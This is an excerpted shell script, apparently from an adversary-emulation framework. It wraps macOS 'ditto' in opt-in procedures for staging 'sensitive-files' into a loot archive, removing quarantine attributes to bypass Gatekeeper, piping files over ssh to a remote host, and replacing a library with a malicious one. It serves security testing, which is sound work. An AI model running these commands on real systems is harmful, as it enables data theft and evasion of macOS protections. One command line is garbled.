#!/bin/sh
# POSIX-compliant
# Procedure Name: ditto
# Tactic: Defense Evasion
# Technique: T1036.005
# GUID: 88f59e87-8ca6-4c6e-a1b0-8ee9cecfd6b6
# Intent: Copy files and directories while preserving file attributes and permissions. Sourced from LOOBins; confirm MITRE mapping for each enabled option.
...
TTP_ID="T1036.005" #replace with you coresponding ttp_id
...
COPY_AND_COMPRESS_SENSITIVE_DATA_LOCALLY=false
REMOVE_EXTENDED_ATTRIBUTES_FROM_A_FILE=false
COPY_COMPRESS_AND_TRANSFER_SENSITIVE_DATA_TO_A_REMOTE_MACOS_HOST=false
DLL_HJIACKING=false

CMD_DITTO="/usr/bin/ditto"
...
PROCEDURE_NAME="ditto"  # Set by build system from YAML procedure_name field
...
# We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
        --copy-and-compress-sensitive-data-locally)
            COPY_AND_COMPRESS_SENSITIVE_DATA_LOCALLY=true
            ;;
        --remove-extended-attributes-from-a-file)
            REMOVE_EXTENDED_ATTRIBUTES_FROM_A_FILE=true
            ;;
        --copy-compress-and-transfer-sensitive-data-to-a-remote-macos-host)
            COPY_COMPRESS_AND_TRANSFER_SENSITIVE_DATA_TO_A_REMOTE_MACOS_HOST=true
            ;;
        --dll-hjiacking)
            DLL_HJIACKING=true
            ;;
...
SCRIPT:
  --copy-and-compress-sensitive-data-locally The following command gathers and compresses (-c) files from the specified folder and writes them to
  --remove-extended-attributes-from-a-file ditto can be used to bypass Gatekeeper by removing the "com.apple.quarantine" extended attribute.
  --copy-compress-and-transfer-sensitive-data-to-a-remote-macos-host The following command gathers and compresses (-c) files from the specified folder and writes them to
  --dll-hjiacking                  Replace a legitimate library with a malicious one while maintaining the original file permissions an
...
# Execute functions for --copy-and-compress-sensitive-data-locally
if [ "$COPY_AND_COMPRESS_SENSITIVE_DATA_LOCALLY" = true ]; then
    core_debug_print "Executing functions for --copy-and-compress-sensitive-data-locally"
    result=$(execute_function execute_copy_compress_sensitive_data_locally)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --remove-extended-attributes-from-a-file
if [ "$REMOVE_EXTENDED_ATTRIBUTES_FROM_A_FILE" = true ]; then
    core_debug_print "Executing functions for --remove-extended-attributes-from-a-file"
    result=$(execute_function execute_remove_extended_attributes_from_file)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --copy-compress-and-transfer-sensitive-data-to-a-remote-macos-host
if [ "$COPY_COMPRESS_AND_TRANSFER_SENSITIVE_DATA_TO_A_REMOTE_MACOS_HOST" = true ]; then
    core_debug_print "Executing functions for --copy-compress-and-transfer-sensitive-data-to-a-remote-macos-host"
    result=$(execute_function execute_copy_compress_transfer_sensitive_data_remote_macos_host)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --dll-hjiacking
if [ "$DLL_HJIACKING" = true ]; then
    core_debug_print "Executing functions for --dll-hjiacking"
    result=$(execute_function execute_dll_hjiacking)
    raw_output="${raw_output}${result}"
fi
...
# Function: execute_copy_compress_sensitive_data_locally
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
...
execute_copy_compress_sensitive_data_locally() {
    local result
    result=$(ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files /tmp/l00t.zip 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_remove_extended_attributes_from_file
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required
...
execute_remove_extended_attributes_from_file() {
    local result
    result=$(ditto -c -k unsigned.app app.zip ditto -x -k app.zip unsigned.app 2>/dev/null 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_copy_compress_transfer_sensitive_data_remote_macos_host
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required
...
execute_copy_compress_transfer_sensitive_data_remote_macos_host() {
    local result
    result=$(ditto -c --norsrc /home/user/sensitive-files - | ssh remote_host ditto -x --norsrc - /home/user/l00t 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_dll_hjiacking
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required
...
execute_dll_hjiacking() {
    local result
    result=$(ditto -V /path/to/malicious-library/malicious_library.dylib /path/to/target-library/original_library.dylib 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}
